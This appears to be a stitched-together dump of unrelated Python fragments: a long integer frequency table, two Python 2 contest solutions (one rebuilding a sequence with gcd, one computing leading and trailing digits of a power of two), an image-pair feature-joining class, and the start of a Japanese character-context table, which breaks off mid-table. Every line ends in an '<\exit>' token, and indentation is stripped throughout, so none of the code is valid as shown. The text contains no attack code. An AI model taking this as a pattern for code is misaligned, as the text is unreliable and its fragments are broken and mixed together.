3146,6703,6704,3409,2196,6705,4429,6706,6707,6708,2534,1996,6709,6710,6711,2747,<\exit>
6712,6713,6714,4786,3643,6715,4430,4431,6716,3557,6717,4432,4433,6718,6719,6720,<\exit>
6721,3749,6722,4006,4787,6723,6724,3644,4788,4434,6725,6726,4789,2772,6727,6728,<\exit>
6729,6730,6731,2708,3865,2813,4435,6732,6733,4790,4791,3480,6734,6735,6736,6737,<\exit>
4436,3348,6738,3410,4007,6739,6740,4008,6741,6742,4792,3411,4191,6743,6744,6745,<\exit>
6746,6747,3866,6748,3750,6749,6750,6751,6752,6753,6754,6755,3867,6756,4009,6757,<\exit>
4793,4794,6758,2814,2987,6759,6760,6761,4437,6762,6763,6764,6765,3645,6766,6767,<\exit>
3481,4192,6768,3751,6769,6770,2174,6771,3868,3752,6772,6773,6774,4193,4795,4438,<\exit>
3558,4796,4439,6775,4797,6776,6777,4798,6778,4799,3559,4800,6779,6780,6781,3482,<\exit>
6782,2893,6783,6784,4194,4801,4010,6785,6786,4440,6787,4011,6788,6789,6790,6791,<\exit>
6792,6793,4802,6794,6795,6796,4012,6797,6798,6799,6800,3349,4803,3483,6801,4804,<\exit>
4195,6802,4013,6803,6804,4196,6805,4014,4015,6806,2847,3271,2848,6807,3484,6808,<\exit>
6809,6810,4441,6811,4442,4197,4443,3272,4805,6812,3412,4016,1579,6813,6814,4017,<\exit>
6815,3869,6816,2964,6817,4806,6818,6819,4018,3646,6820,6821,4807,4019,4020,6822,<\exit>
6823,3560,6824,6825,4021,4444,6826,4198,6827,6828,4445,6829,6830,4199,4808,6831,<\exit>
6832,6833,3870,3019,2458,6834,3753,3413,3350,6835,4809,3871,4810,3561,4446,6836,<\exit>
6837,4447,4811,4812,6838,2459,4448,6839,4449,6840,6841,4022,3872,6842,4813,4814,<\exit>
6843,6844,4815,4200,4201,4202,6845,4023,6846,6847,4450,3562,3873,6848,6849,4816,<\exit>
4817,6850,4451,4818,2139,6851,3563,6852,6853,3351,6854,6855,3352,4024,2709,3414,<\exit>
4203,4452,6856,4204,6857,6858,3874,3875,6859,6860,4819,6861,6862,6863,6864,4453,<\exit>
3647,6865,6866,4820,6867,6868,6869,6870,4454,6871,2869,6872,6873,4821,6874,3754,<\exit>
6875,4822,4205,6876,6877,6878,3648,4206,4455,6879,4823,6880,4824,3876,6881,3055,<\exit>
4207,6882,3415,6883,6884,6885,4208,4209,6886,4210,3353,6887,3354,3564,3209,3485,<\exit>
2652,6888,2728,6889,3210,3755,6890,4025,4456,6891,4825,6892,6893,6894,6895,4211,<\exit>
6896,6897,6898,4826,6899,6900,4212,6901,4827,6902,2773,3565,6903,4828,6904,6905,<\exit>
6906,6907,3649,3650,6908,2849,3566,6909,3567,3100,6910,6911,6912,6913,6914,6915,<\exit>
4026,6916,3355,4829,3056,4457,3756,6917,3651,6918,4213,3652,2870,6919,4458,6920,<\exit>
2438,6921,6922,3757,2774,4830,6923,3356,4831,4832,6924,4833,4459,3653,2507,6925,<\exit>
4834,2535,6926,6927,3273,4027,3147,6928,3568,6929,6930,6931,4460,6932,3877,4461,<\exit>
2729,3654,6933,6934,6935,6936,2175,4835,2630,4214,4028,4462,4836,4215,6937,3148,<\exit>
4216,4463,4837,4838,4217,6938,6939,2850,4839,6940,4464,6941,6942,6943,4840,6944,<\exit>
4218,3274,4465,6945,6946,2710,6947,4841,4466,6948,6949,2894,6950,6951,4842,6952,<\exit>
4219,3057,2871,6953,6954,6955,6956,4467,6957,2711,6958,6959,6960,3275,3101,4843,<\exit>
6961,3357,3569,6962,4844,6963,6964,4468,4845,3570,6965,3102,4846,3758,6966,4847,<\exit>
3878,4848,4849,4029,6967,2929,3879,4850,4851,6968,6969,1733,6970,4220,6971,6972,<\exit>
6973,6974,6975,6976,4852,6977,6978,6979,6980,6981,6982,3759,6983,6984,6985,3486,<\exit>
3487,6986,3488,3416,6987,6988,6989,6990,6991,6992,6993,6994,6995,6996,6997,4853,<\exit>
6998,6999,4030,7000,7001,3211,7002,7003,4221,7004,7005,3571,4031,7006,3572,7007,<\exit>
2614,4854,2577,7008,7009,2965,3655,3656,4855,2775,3489,3880,4222,4856,3881,4032,<\exit>
3882,3657,2730,3490,4857,7010,3149,7011,4469,4858,2496,3491,4859,2283,7012,7013,<\exit>
7014,2365,4860,4470,7015,7016,3760,7017,7018,4223,1917,7019,7020,7021,4471,7022,<\exit>
2776,4472,7023,7024,7025,7026,4033,7027,3573,4224,4861,4034,4862,7028,7029,1929,<\exit>
3883,4035,7030,4473,3058,7031,2536,3761,3884,7032,4036,7033,2966,2895,1968,4474,<\exit>
3276,4225,3417,3492,4226,2105,7034,7035,1754,2596,3762,4227,4863,4475,3763,4864,<\exit>
3764,2615,2777,3103,3765,3658,3418,4865,2296,3766,2815,7036,7037,7038,3574,2872,<\exit>
3277,4476,7039,4037,4477,7040,7041,4038,7042,7043,7044,7045,7046,7047,2537,7048,<\exit>
7049,7050,7051,7052,7053,7054,4478,7055,7056,3767,3659,4228,3575,7057,7058,4229,<\exit>
7059,7060,7061,3660,7062,3212,7063,3885,4039,2460,7064,7065,7066,7067,7068,7069,<\exit>
7070,7071,7072,7073,7074,4866,3768,4867,7075,7076,7077,7078,4868,3358,3278,2653,<\exit>
7079,7080,4479,3886,7081,7082,4869,7083,7084,7085,7086,7087,7088,2538,7089,7090,<\exit>
7091,4040,3150,3769,4870,4041,2896,3359,4230,2930,7092,3279,7093,2967,4480,3213,<\exit>
4481,3661,7094,7095,7096,7097,7098,7099,7100,7101,7102,2461,3770,7103,7104,4231,<\exit>
3151,7105,7106,7107,4042,3662,7108,7109,4871,3663,4872,4043,3059,7110,7111,7112,<\exit>
3493,2988,7113,4873,7114,7115,7116,3771,4874,7117,7118,4232,4875,7119,3576,2336,<\exit>
4876,7120,4233,3419,4044,4877,4878,4482,4483,4879,4484,4234,7121,3772,4880,1045,<\exit>
3280,3664,4881,4882,7122,7123,7124,7125,4883,7126,2778,7127,4485,4486,7128,4884,<\exit>
3214,3887,7129,7130,3215,7131,4885,4045,7132,7133,4046,7134,7135,7136,7137,7138,<\exit>
7139,7140,7141,7142,7143,4235,7144,4886,7145,7146,7147,4887,7148,7149,7150,4487,<\exit>
4047,4488,7151,7152,4888,4048,2989,3888,7153,3665,7154,4049,7155,7156,7157,7158,<\exit>
7159,7160,2931,4889,4890,4489,7161,2631,3889,4236,2779,7162,7163,4891,7164,3060,<\exit>
7165,1672,4892,7166,4893,4237,3281,4894,7167,7168,3666,7169,3494,7170,7171,4050,<\exit>
7172,7173,3104,3360,3420,4490,4051,2684,4052,7174,4053,7175,7176,7177,2253,4054,<\exit>
7178,7179,4895,7180,3152,3890,3153,4491,3216,7181,7182,7183,2968,4238,4492,4055,<\exit>
7184,2990,7185,2479,7186,7187,4493,7188,7189,7190,7191,7192,4896,7193,4897,2969,<\exit>
4494,4898,7194,3495,7195,7196,4899,4495,7197,3105,2731,7198,4900,7199,7200,7201,<\exit>
4056,7202,3361,7203,7204,4496,4901,4902,7205,4497,7206,7207,2315,4903,7208,4904,<\exit>
7209,4905,2851,7210,7211,3577,7212,3578,4906,7213,4057,3667,4907,7214,4058,2354,<\exit>
3891,2376,3217,3773,7215,7216,7217,7218,7219,4498,7220,4908,3282,2685,7221,3496,<\exit>
4909,2632,3154,4910,7222,2337,7223,4911,7224,7225,7226,4912,4913,3283,4239,4499,<\exit>
7227,2816,7228,7229,7230,7231,7232,7233,7234,4914,4500,4501,7235,7236,7237,2686,<\exit>
7238,4915,7239,2897,4502,7240,4503,7241,2516,7242,4504,3362,3218,7243,7244,7245,<\exit>
4916,7246,7247,4505,3363,7248,7249,7250,7251,3774,4506,7252,7253,4917,7254,7255,<\exit>
3284,2991,4918,4919,3219,3892,4920,3106,3497,4921,7256,7257,7258,4922,7259,4923,<\exit>
3364,4507,4508,4059,7260,4240,3498,7261,7262,4924,7263,2992,3893,4060,3220,7264,<\exit>
7265,7266,7267,7268,7269,4509,3775,7270,2817,7271,4061,4925,4510,3776,7272,4241,<\exit>
4511,3285,7273,7274,3499,7275,7276,7277,4062,4512,4926,7278,3107,3894,7279,7280,<\exit>
4927,7281,4513,7282,7283,3668,7284,7285,4242,4514,4243,7286,2058,4515,4928,4929,<\exit>
4516,7287,3286,4244,7288,4517,7289,7290,7291,3669,7292,7293,4930,4931,4932,2355,<\exit>
4933,7294,2633,4518,7295,4245,7296,7297,4519,7298,7299,4520,4521,4934,7300,4246,<\exit>
4522,7301,7302,7303,3579,7304,4247,4935,7305,4936,7306,7307,7308,7309,3777,7310,<\exit>
4523,7311,7312,7313,4248,3580,7314,4524,3778,4249,7315,3581,7316,3287,7317,3221,<\exit>
7318,4937,7319,7320,7321,7322,7323,7324,4938,4939,7325,4525,7326,7327,7328,4063,<\exit>
7329,7330,4940,7331,7332,4941,7333,4526,7334,3500,2780,1741,4942,2026,1742,7335,<\exit>
7336,3582,4527,2388,7337,7338,7339,4528,7340,4250,4943,7341,7342,7343,4944,7344,<\exit>
7345,7346,3020,7347,4945,7348,7349,7350,7351,3895,7352,3896,4064,3897,7353,7354,<\exit>
7355,4251,7356,7357,3898,7358,3779,7359,3780,3288,7360,7361,4529,7362,4946,4530,<\exit>
2027,7363,3899,4531,4947,3222,3583,7364,4948,7365,7366,7367,7368,4949,3501,4950,<\exit>
3781,4951,4532,7369,2517,4952,4252,4953,3155,7370,4954,4955,4253,2518,4533,7371,<\exit>
7372,2712,4254,7373,7374,7375,3670,4956,3671,7376,2389,3502,4065,7377,2338,7378,<\exit>
7379,7380,7381,3061,7382,4957,7383,7384,7385,7386,4958,4534,7387,7388,2993,7389,<\exit>
3062,7390,4959,7391,7392,7393,4960,3108,4961,7394,4535,7395,4962,3421,4536,7396,<\exit>
4963,7397,4964,1857,7398,4965,7399,7400,2176,3584,4966,7401,7402,3422,4537,3900,<\exit>
3585,7403,3782,7404,2852,7405,7406,7407,4538,3783,2654,3423,4967,4539,7408,3784,<\exit>
3586,2853,4540,4541,7409,3901,7410,3902,7411,7412,3785,3109,2327,3903,7413,7414,<\exit>
2970,4066,2932,7415,7416,7417,3904,3672,3424,7418,4542,4543,4544,7419,4968,7420,<\exit>
7421,4255,7422,7423,7424,7425,7426,4067,7427,3673,3365,4545,7428,3110,2559,3674,<\exit>
7429,7430,3156,7431,7432,3503,7433,3425,4546,7434,3063,2873,7435,3223,4969,4547,<\exit>
4548,2898,4256,4068,7436,4069,3587,3786,2933,3787,4257,4970,4971,3788,7437,4972,<\exit>
3064,7438,4549,7439,7440,7441,7442,7443,4973,3905,7444,2874,7445,7446,7447,7448,<\exit>
3021,7449,4550,3906,3588,4974,7450,7451,3789,3675,7452,2578,7453,4070,7454,7455,<\exit>
7456,4258,3676,7457,4975,7458,4976,4259,3790,3504,2634,4977,3677,4551,4260,7459,<\exit>
7460,7461,7462,3907,4261,4978,7463,7464,7465,7466,4979,4980,7467,7468,2213,4262,<\exit>
7469,7470,7471,3678,4981,7472,2439,7473,4263,3224,3289,7474,3908,2415,4982,7475,<\exit>
4264,7476,4983,2655,7477,7478,2732,4552,2854,2875,7479,7480,4265,7481,4553,4984,<\exit>
7482,7483,4266,7484,3679,3366,3680,2818,2781,2782,3367,3589,4554,3065,7485,4071,<\exit>
2899,7486,7487,3157,2462,4072,4555,4073,4985,4986,3111,4267,2687,3368,4556,4074,<\exit>
3791,4268,7488,3909,2783,7489,2656,1962,3158,4557,4987,1963,3159,3160,7490,3112,<\exit>
4988,4989,3022,4990,4991,3792,2855,7491,7492,2971,4558,7493,7494,4992,7495,7496,<\exit>
7497,7498,4993,7499,3426,4559,4994,7500,3681,4560,4269,4270,3910,7501,4075,4995,<\exit>
4271,7502,7503,4076,7504,4996,7505,3225,4997,4272,4077,2819,3023,7506,7507,2733,<\exit>
4561,7508,4562,7509,3369,3793,7510,3590,2508,7511,7512,4273,3113,2994,2616,7513,<\exit>
7514,7515,7516,7517,7518,2820,3911,4078,2748,7519,7520,4563,4998,7521,7522,7523,<\exit>
7524,4999,4274,7525,4564,3682,2239,4079,4565,7526,7527,7528,7529,5000,7530,7531,<\exit>
5001,4275,3794,7532,7533,7534,3066,5002,4566,3161,7535,7536,4080,7537,3162,7538,<\exit>
7539,4567,7540,7541,7542,7543,7544,7545,5003,7546,4568,7547,7548,7549,7550,7551,<\exit>
7552,7553,7554,7555,7556,5004,7557,7558,7559,5005,7560,3795,7561,4569,7562,7563,<\exit>
7564,2821,3796,4276,4277,4081,7565,2876,7566,5006,7567,7568,2900,7569,3797,3912,<\exit>
7570,7571,7572,4278,7573,7574,7575,5007,7576,7577,5008,7578,7579,4279,2934,7580,<\exit>
7581,5009,7582,4570,7583,4280,7584,7585,7586,4571,4572,3913,7587,4573,3505,7588,<\exit>
5010,7589,7590,7591,7592,3798,4574,7593,7594,5011,7595,4281,7596,7597,7598,4282,<\exit>
5012,7599,7600,5013,3163,7601,5014,7602,3914,7603,7604,2734,4575,4576,4577,7605,<\exit>
7606,7607,7608,7609,3506,5015,4578,7610,4082,7611,2822,2901,2579,3683,3024,4579,<\exit>
3507,7612,4580,7613,3226,3799,5016,7614,7615,7616,7617,7618,7619,7620,2995,3290,<\exit>
7621,4083,7622,5017,7623,7624,7625,7626,7627,4581,3915,7628,3291,7629,5018,7630,<\exit>
7631,7632,7633,4084,7634,7635,3427,3800,7636,7637,4582,7638,5019,4583,5020,7639,<\exit>
3916,7640,3801,5021,4584,4283,7641,7642,3428,3591,2269,7643,2617,7644,4585,3592,<\exit>
7645,4586,2902,7646,7647,3227,5022,7648,4587,7649,4284,7650,7651,7652,4588,2284,<\exit>
7653,5023,7654,7655,7656,4589,5024,3802,7657,7658,5025,3508,4590,7659,7660,7661,<\exit>
1969,5026,7662,7663,3684,1821,2688,7664,2028,2509,4285,7665,2823,1841,7666,2689,<\exit>
3114,7667,3917,4085,2160,5027,5028,2972,7668,5029,7669,7670,7671,3593,4086,7672,<\exit>
4591,4087,5030,3803,7673,7674,7675,7676,7677,7678,7679,4286,2366,4592,4593,3067,<\exit>
2328,7680,7681,4594,3594,3918,2029,4287,7682,5031,3919,3370,4288,4595,2856,7683,<\exit>
3509,7684,7685,5032,5033,7686,7687,3804,2784,7688,7689,7690,7691,3371,7692,7693,<\exit>
2877,5034,7694,7695,3920,4289,4088,7696,7697,7698,5035,7699,5036,4290,5037,5038,<\exit>
5039,7700,7701,7702,5040,5041,3228,7703,1760,7704,5042,3229,4596,2106,4089,7705,<\exit>
4597,2824,5043,2107,3372,7706,4291,4090,5044,7707,4091,7708,5045,3025,3805,4598,<\exit>
4292,4293,4294,3373,7709,4599,7710,5046,7711,7712,5047,5048,3806,7713,7714,7715,<\exit>
5049,7716,7717,7718,7719,4600,5050,7720,7721,7722,5051,7723,4295,3429,7724,7725,<\exit>
7726,7727,3921,7728,3292,5052,4092,7729,7730,7731,7732,7733,7734,7735,5053,5054,<\exit>
7736,7737,7738,7739,3922,3685,7740,7741,7742,7743,2635,5055,7744,5056,4601,7745,<\exit>
7746,2560,7747,7748,7749,7750,3923,7751,7752,7753,7754,7755,4296,2903,7756,7757,<\exit>
7758,7759,7760,3924,7761,5057,4297,7762,7763,5058,4298,7764,4093,7765,7766,5059,<\exit>
3925,7767,7768,7769,7770,7771,7772,7773,7774,7775,7776,3595,7777,4299,5060,4094,<\exit>
7778,3293,5061,7779,7780,4300,7781,7782,4602,7783,3596,7784,7785,3430,2367,7786,<\exit>
3164,5062,5063,4301,7787,7788,4095,5064,5065,7789,3374,3115,7790,7791,7792,7793,<\exit>
7794,7795,7796,3597,4603,7797,7798,3686,3116,3807,5066,7799,7800,5067,7801,7802,<\exit>
4604,4302,5068,4303,4096,7803,7804,3294,7805,7806,5069,4605,2690,7807,3026,7808,<\exit>
7809,7810,7811,7812,7813,7814,7815,7816,7817,7818,7819,7820,7821,7822,7823,7824,<\exit>
7825,7826,7827,7828,7829,7830,7831,7832,7833,7834,7835,7836,7837,7838,7839,7840,<\exit>
7841,7842,7843,7844,7845,7846,7847,7848,7849,7850,7851,7852,7853,7854,7855,7856,<\exit>
7857,7858,7859,7860,7861,7862,7863,7864,7865,7866,7867,7868,7869,7870,7871,7872,<\exit>
7873,7874,7875,7876,7877,7878,7879,7880,7881,7882,7883,7884,7885,7886,7887,7888,<\exit>
7889,7890,7891,7892,7893,7894,7895,7896,7897,7898,7899,7900,7901,7902,7903,7904,<\exit>
7905,7906,7907,7908,7909,7910,7911,7912,7913,7914,7915,7916,7917,7918,7919,7920,<\exit>
7921,7922,7923,7924,3926,7925,7926,7927,7928,7929,7930,7931,7932,7933,7934,7935,<\exit>
7936,7937,7938,7939,7940,7941,7942,7943,7944,7945,7946,7947,7948,7949,7950,7951,<\exit>
7952,7953,7954,7955,7956,7957,7958,7959,7960,7961,7962,7963,7964,7965,7966,7967,<\exit>
7968,7969,7970,7971,7972,7973,7974,7975,7976,7977,7978,7979,7980,7981,7982,7983,<\exit>
7984,7985,7986,7987,7988,7989,7990,7991,7992,7993,7994,7995,7996,7997,7998,7999,<\exit>
8000,8001,8002,8003,8004,8005,8006,8007,8008,8009,8010,8011,8012,8013,8014,8015,<\exit>
8016,8017,8018,8019,8020,8021,8022,8023,8024,8025,8026,8027,8028,8029,8030,8031,<\exit>
8032,8033,8034,8035,8036,8037,8038,8039,8040,8041,8042,8043,8044,8045,8046,8047,<\exit>
8048,8049,8050,8051,8052,8053,8054,8055,8056,8057,8058,8059,8060,8061,8062,8063,<\exit>
8064,8065,8066,8067,8068,8069,8070,8071,8072,8073,8074,8075,8076,8077,8078,8079,<\exit>
8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,<\exit>
8096,8097,8098,8099,8100,8101,8102,8103,8104,8105,8106,8107,8108,8109,8110,8111,<\exit>
8112,8113,8114,8115,8116,8117,8118,8119,8120,8121,8122,8123,8124,8125,8126,8127,<\exit>
8128,8129,8130,8131,8132,8133,8134,8135,8136,8137,8138,8139,8140,8141,8142,8143,<\exit>
8144,8145,8146,8147,8148,8149,8150,8151,8152,8153,8154,8155,8156,8157,8158,8159,<\exit>
8160,8161,8162,8163,8164,8165,8166,8167,8168,8169,8170,8171,8172,8173,8174,8175,<\exit>
8176,8177,8178,8179,8180,8181,8182,8183,8184,8185,8186,8187,8188,8189,8190,8191,<\exit>
8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8203,8204,8205,8206,8207,<\exit>
8208,8209,8210,8211,8212,8213,8214,8215,8216,8217,8218,8219,8220,8221,8222,8223,<\exit>
8224,8225,8226,8227,8228,8229,8230,8231,8232,8233,8234,8235,8236,8237,8238,8239,<\exit>
8240,8241,8242,8243,8244,8245,8246,8247,8248,8249,8250,8251,8252,8253,8254,8255,<\exit>
8256,8257,8258,8259,8260,8261,8262,8263,8264,8265,8266,8267,8268,8269,8270,8271)<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
A = cipher<\exit>
B = []<\exit>
B.append(A[0])<\exit>
for i in xrange(1, len(A)):<\exit>
B.append(A[i] * A[i - 1] / self.gcd(A[i], A[i - 1]))<\exit>
B.append(A[-1])<\exit>
return " ".join(map(str, B))<\exit>
def gcd(self, a, b):<\exit>
while b:<\exit>
a, b = b, a % b<\exit>
return a<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
N = int(f.readline().strip())<\exit>
cipher = map(int, f.readline().strip().split(' '))<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
import pickle<\exit>
import numpy as np<\exit>
import os.path<\exit>
import numpy.matlib as mat<\exit>
class Join_Ftr(object):<\exit>
def Join_feature(self, fl1, fl2):<\exit>
ftr1 = pickle.load(fl1)<\exit>
ftr2 = pickle.load(fl2)<\exit>
row, col = ftr1.shape<\exit>
jnt_ftr = np.empty([5, col * 2])<\exit>
for i in range(5):<\exit>
jnt_ftr[i] = np.append(ftr1[i], ftr2[i])<\exit>
return jnt_ftr<\exit>
def Constrct_XY(self, feature_pth, X_info):<\exit>
X = []<\exit>
Y = []<\exit>
for i in range(len(X_info)):<\exit>
pth1 = os.path.join(feature_pth, X_info[i][0])<\exit>
pth2 = os.path.join(feature_pth, X_info[i][1])<\exit>
if os.path.exists(pth1) and os.path.exists(pth2):<\exit>
fl1 = open(pth1, 'r')<\exit>
fl2 = open(pth2, 'r')<\exit>
X.append(self.Join_feature(fl1, fl2))<\exit>
Y.append(X_info[i][2])<\exit>
fl1.close()<\exit>
fl2.close()<\exit>
return X, Y<\exit>
def XY_in(self, X, Y):<\exit>
assert len(X) == len(Y), "the number of the image pair and their corresponding y is not equal"<\exit>
num_of_pair = len(X)<\exit>
num_of_patch = X[0].shape[0]<\exit>
n_ftr = X[0].shape[1]<\exit>
X_in = mat.zeros([num_of_pair * num_of_patch * 2, n_ftr])<\exit>
Y_in = mat.zeros([num_of_pair * num_of_patch * 2, 1])<\exit>
num = 0<\exit>
for i in range(num_of_pair):<\exit>
img_pair = X[i]<\exit>
for j in range(num_of_patch):<\exit>
X_in[num] = img_pair[j]<\exit>
Y_in[num] = Y[i]<\exit>
num = num + 1<\exit>
X_in[num, 0:n_ftr / 2] = img_pair[j][n_ftr / 2:]<\exit>
X_in[num, n_ftr / 2:] = img_pair[j][0:n_ftr / 2]<\exit>
Y_in[num] = Y[i]<\exit>
num = num + 1<\exit>
return X_in, Y_in<\exit>
import math<\exit>
from decimal import *<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
getcontext().prec = 28<\exit>
def solve(self, cipher):<\exit>
N, K = cipher<\exit>
LSB = pow(2, N - 1, 10 ** K)<\exit>
MSB = int(str(self.get_MSB(2, N - 1) * 10 ** K)[:K])<\exit>
return MSB + LSB<\exit>
def get_MSB(self, b, n):<\exit>
p = Decimal(n) * Decimal(b).log10()<\exit>
f = Decimal(p) - Decimal(math.floor(p))<\exit>
return Decimal(10) ** f<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
solution = Solution()<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = map(int, f.readline().strip().split(' '))<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
from .compat import wrap_ord<\exit>
NUM_OF_CATEGORY = 6<\exit>
DONT_KNOW = -1<\exit>
ENOUGH_REL_THRESHOLD = 100<\exit>
MAX_REL_THRESHOLD = 1000<\exit>
MINIMUM_DATA_THRESHOLD = 4<\exit>
jp2CharContext = (<\exit>
(0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1),<\exit>
(2,4,0,4,0,3,0,4,0,3,4,4,4,2,4,3,3,4,3,2,3,3,4,2,3,3,3,2,4,1,4,3,3,1,5,4,3,4,3,4,3,5,3,0,3,5,4,2,0,3,1,0,3,3,0,3,3,0,1,1,0,4,3,0,3,3,0,4,0,2,0,3,5,5,5,5,4,0,4,1,0,3,4),<\exit>
(0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2),<\exit>
(0,4,0,5,0,5,0,4,0,4,5,4,4,3,5,3,5,1,5,3,4,3,4,4,3,4,3,3,4,3,5,4,4,3,5,5,3,5,5,5,3,5,5,3,4,5,5,3,1,3,2,0,3,4,0,4,2,0,4,2,1,5,3,2,3,5,0,4,0,2,0,5,4,4,5,4,5,0,4,0,0,4,4),<\exit>
(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),<\exit>
(0,3,0,4,0,3,0,3,0,4,5,4,3,3,3,3,4,3,5,4,4,3,5,4,4,3,4,3,4,4,4,4,5,3,4,4,3,4,5,5,4,5,5,1,4,5,4,3,0,3,3,1,3,3,0,4,4,0,3,3,1,5,3,3,3,5,0,4,0,3,0,4,4,3,4,3,3,0,4,1,1,3,4),<\exit>
(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),<\exit>
(0,4,0,3,0,3,0,4,0,3,4,4,3,2,2,1,2,1,3,1,3,3,3,3,3,4,3,1,3,3,5,3,3,0,4,3,0,5,4,3,3,5,4,4,3,4,4,5,0,1,2,0,1,2,0,2,2,0,1,0,0,5,2,2,1,4,0,3,0,1,0,4,4,3,5,4,3,0,2,1,0,4,3),<\exit>
(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),<\exit>
(0,3,0,5,0,4,0,2,1,4,4,2,4,1,4,2,4,2,4,3,3,3,4,3,3,3,3,1,4,2,3,3,3,1,4,4,1,1,1,4,3,3,2,0,2,4,3,2,0,3,3,0,3,1,1,0,0,0,3,3,0,4,2,2,3,4,0,4,0,3,0,4,4,5,3,4,4,0,3,0,0,1,4),<\exit>
(1,4,0,4,0,4,0,4,0,3,5,4,4,3,4,3,5,4,3,3,4,3,5,4,4,4,4,3,4,2,4,3,3,1,5,4,3,2,4,5,4,5,5,4,4,5,4,4,0,3,2,2,3,3,0,4,3,1,3,2,1,4,3,3,4,5,0,3,0,2,0,4,5,5,4,5,4,0,4,0,0,5,4),<\exit>
(0,5,0,5,0,4,0,3,0,4,4,3,4,3,3,3,4,0,4,4,4,3,4,3,4,3,3,1,4,2,4,3,4,0,5,4,1,4,5,4,4,5,3,2,4,3,4,3,2,4,1,3,3,3,2,3,2,0,4,3,3,4,3,3,3,4,0,4,0,3,0,4,5,4,4,4,3,0,4,1,0,1,3),<\exit>
(0,3,1,4,0,3,0,2,0,3,4,4,3,1,4,2,3,3,4,3,4,3,4,3,4,4,3,2,3,1,5,4,4,1,4,4,3,5,4,4,3,5,5,4,3,4,4,3,1,2,3,1,2,2,0,3,2,0,3,1,0,5,3,3,3,4,3,3,3,3,4,4,4,4,5,4,2,0,3,3,2,4,3),<\exit>
(0,2,0,3,0,1,0,1,0,0,3,2,0,0,2,0,1,0,2,1,3,3,3,1,2,3,1,0,1,0,4,2,1,1,3,3,0,4,3,3,1,4,3,3,0,3,3,2,0,0,0,0,1,0,0,2,0,0,0,0,0,4,1,0,2,3,2,2,2,1,3,3,3,4,4,3,2,0,3,1,0,3,3),<\exit>
(0,4,0,4,0,3,0,3,0,4,4,4,3,3,3,3,3,3,4,3,4,2,4,3,4,3,3,2,4,3,4,5,4,1,4,5,3,5,4,5,3,5,4,0,3,5,5,3,1,3,3,2,2,3,0,3,4,1,3,3,2,4,3,3,3,4,0,4,0,3,0,4,5,4,4,5,3,0,4,1,0,3,4),<\exit>
(0,2,0,3,0,3,0,0,0,2,2,2,1,0,1,0,0,0,3,0,3,0,3,0,1,3,1,0,3,1,3,3,3,1,3,3,3,0,1,3,1,3,4,0,0,3,1,1,0,3,2,0,0,0,0,1,3,0,1,0,0,3,3,2,0,3,0,0,0,0,0,3,4,3,4,3,3,0,3,0,0,2,3),<\exit>
(2,3,0,3,0,2,0,1,0,3,3,4,3,1,3,1,1,1,3,1,4,3,4,3,3,3,0,0,3,1,5,4,3,1,4,3,2,5,5,4,4,4,4,3,3,4,4,4,0,2,1,1,3,2,0,1,2,0,0,1,0,4,1,3,3,3,0,3,0,1,0,4,4,4,5,5,3,0,2,0,0,4,4),<\exit>
(0,2,0,1,0,3,1,3,0,2,3,3,3,0,3,1,0,0,3,0,3,2,3,1,3,2,1,1,0,0,4,2,1,0,2,3,1,4,3,2,0,4,4,3,1,3,1,3,0,1,0,0,1,0,0,0,1,0,0,0,0,4,1,1,1,2,0,3,0,0,0,3,4,2,4,3,2,0,1,0,0,3,3),<\exit>
(0,1,0,4,0,5,0,4,0,2,4,4,2,3,3,2,3,3,5,3,3,3,4,3,4,2,3,0,4,3,3,3,4,1,4,3,2,1,5,5,3,4,5,1,3,5,4,2,0,3,3,0,1,3,0,4,2,0,1,3,1,4,3,3,3,3,0,3,0,1,0,3,4,4,4,5,5,0,3,0,1,4,5),<\exit>
(0,2,0,3,0,3,0,0,0,2,3,1,3,0,4,0,1,1,3,0,3,4,3,2,3,1,0,3,3,2,3,1,3,0,2,3,0,2,1,4,1,2,2,0,0,3,3,0,0,2,0,0,0,1,0,0,0,0,2,2,0,3,2,1,3,3,0,2,0,2,0,0,3,3,1,2,4,0,3,0,2,2,3),<\exit>
